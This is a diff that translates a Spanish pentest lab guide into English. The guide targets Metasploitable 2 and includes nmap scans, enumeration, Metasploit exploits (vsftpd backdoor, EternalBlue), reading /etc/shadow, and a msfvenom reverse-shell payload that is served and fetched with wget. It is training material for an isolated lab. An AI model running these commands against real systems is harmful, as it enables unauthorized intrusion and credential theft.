@@ -1,29 +1,29 @@
-# Guía Rápida - Tu Primer Pentest en el Lab
+# Quick Guide - Your First Pentest in the Lab
 
-## Objetivo Practicar
+## Objective to Practice
 
-Vamos a hacer un pentest completo contra Metasploitable 2 (192.168.56.200).
+We are going to do a complete pentest against Metasploitable 2 (192.168.56.200).
 
-## Paso 1: Reconocimiento
+## Step 1: Reconnaissance
 
-### Escaneo de Red
+### Network Scanning
 ```bash
-# Ver hosts activos
+# View active hosts
 nmap -sn 192.168.56.0/24
 
-# Escaneo de puertos
+# Port scanning
 nmap -sT -T4 192.168.56.200
 
-# Escaneo de servicios
+# Service scanning
 nmap -sV -sC 192.168.56.200
 ```
 
-### Identificar Servicios
+### Identify Services
 ```bash
-# Ver qué está corriendo
+# See what is running
 nmap -sV -p- 192.168.56.200
 
-# Resultado esperado:
+# Expected result:
 # 21/tcp   ftp
 # 22/tcp   ssh
 # 23/tcp   telnet
@@ -34,60 +34,60 @@ nmap -sV -p- 192.168.56.200
 # 3306/tcp mysql
 ```
 
-## Paso 2: Enumeración
+## Step 2: Enumeration
 
-### HTTP (Puerto 80)
+### HTTP (Port 80)
 ```bash
-# Navegar al servidor web
+# Browse to the web server
 firefox http://192.168.56.200
 
-# Escaneo con Nikto
+# Scanning with Nikto
 nikto -h http://192.168.56.200
 
-# Buscar directorios
+# Find directories
 dirb http://192.168.56.200
 ```
 
-### SMB (Puerto 445)
+### SMB (Port 445)
 ```bash
-# Enumerar shares
+# Enumerate shares
 enum4linux -a 192.168.56.200
 
-# Listar usuarios
+# List users
 enum4linux -U 192.168.56.200
 ```
 
-### FTP (Puerto 21)
+### FTP (Port 21)
 ```bash
-# Conectar con anonymous
+# Connect with anonymous
 ftp 192.168.56.200
-# Usuario: anonymous
-# Contraseña: (vacío)
+# Username: anonymous
+# Password: (empty)
 
-# Listar archivos
+# List files
 ls -la
 ```
 
-## Paso 3: Explotación
+## Step 3: Exploitation
 
-### Opción A: Metasploit - vsftpd Backdoor
+### Option A: Metasploit - vsftpd Backdoor
 ```bash
 msfconsole
 
-# Buscar exploit
+# Search for exploit
 search vsftpd
 
-# Usar exploit
+# Use exploit
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.56.200
 exploit
 
-# Obtener shell
+# Obtain shell
 id
 whoami
 ```
 
-### Opción B: Metasploit - EternalBlue (si Windows estuviera disponible)
+### Option B: Metasploit - EternalBlue (if Windows were available)
 ```bash
 msfconsole
 
@@ -97,48 +97,48 @@ set LHOST 192.168.56.100
 exploit
 ```
 
-### Opción C: Manual - Telnet
+### Option C: Manual - Telnet
 ```bash
-# Conectar por telnet
+# Connect via telnet
 telnet 192.168.56.200
 
-# Credenciales por defecto de Metasploitable:
-# usuario: msfadmin
-# contraseña: msfadmin
+# Default Metasploitable credentials:
+# username: msfadmin
+# password: msfadmin
 ```
 
-## Paso 4: Post-Explotación
+## Step 4: Post-Exploitation
 
-### Obtener Información
+### Gather Information
 ```bash
-# Si tienes shell
+# If you have a shell
 uname -a
 cat /etc/passwd
 cat /etc/shadow
 ifconfig
 ```
 
-### Escalada de Privilegios
+### Privilege Escalation
 ```bash
-# Buscar SUID binaries
+# Find SUID binaries
 find / -perm -4000 2>/dev/null
 
-# Verificar sudo
+# Check sudo
 sudo -l
 
-# Buscar archivos con permisos especiales
+# Find files with special permissions
 find / -writable -type f 2>/dev/null
 ```
 
-## Paso 5: Documentación
+## Step 5: Documentation
 
-### Crear Reporte
-1. Copia el template de hallazgos
-2. Documenta cada paso
-3. Incluye screenshots
-4. Clasifica por severidad
+### Create Report
+1. Copy the findings template
+2. Document each step
+3. Include screenshots
+4. Classify by severity
 
-### Estructura del Reporte
+### Report Structure
 ```
 docs/hallazgos/
 ├── 2024-XX-XX-metasploitable-pentest/
@@ -151,35 +151,35 @@ docs/hallazgos/
 │       └── logs.txt
 ```
 
-## Ejercicios Adicionales
+## Additional Exercises
 
-### Para Principiantes
-1. Encuentra todas las credenciales en Metasploitable
-2. Accede a phpMyAdmin
-3. Explota la vulnerability de SQL Injection en DVWA
+### For Beginners
+1. Find all credentials in Metasploitable
+2. Access phpMyAdmin
+3. Exploit the SQL Injection vulnerability in DVWA
 
-### Para Intermedios
-1. Haz pivot desde Metasploitable a otras VMs
-2. Crea un payload persistente
-3. Usa Meterpreter para moverte lateralmente
+### For Intermediates
+1. Pivot from Metasploitable to other VMs
+2. Create a persistent payload
+3. Use Meterpreter for lateral movement
 
-### Para Avanzados
-1. Combina múltiples vulnerabilidades
-2. Bypass antivirus con encoding
-3. Crea un laboratorio de Active Directory
+### For Advanced
+1. Combine multiple vulnerabilities
+2. Bypass antivirus with encoding
+3. Create an Active Directory lab
 
-## Comandos Útiles
+## Useful Commands
 
 ```bash
-# Generar payload
+# Generate payload
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f elf -o payload.elf
 
-# Escuchar conexiones
+# Listen for connections
 nc -lvp 4444
 
-# Transferir archivos
-python3 -m http.server 8080  # En Kali
-wget http://192.168.56.100:8080/payload.elf  # En target
+# Transfer files
+python3 -m http.server 8080  # On Kali
+wget http://192.168.56.100:8080/payload.elf  # On target
 
 # Proxychains
 proxychains nmap -sT 192.168.57.0/24
@@ -187,8 +187,8 @@ proxychains nmap -sT 192.168.57.0/24
 
 ## Tips
 
-1. **Siempre documenta** cada paso y hallazgo
-2. **No destruyas** los targets - son para práctica
-3. **Experimenta** - prueba diferentes herramientas
-4. **Lee los errores** - te dan información valiosa
-5. **Busca en Google** - cada error tiene solución
+1. **Always document** every step and finding
+2. **Do not destroy** the targets — they are for practice
+3. **Experiment** — try different tools
+4. **Read the errors** — they give you valuable information
+5. **Search Google** — every error has a solution
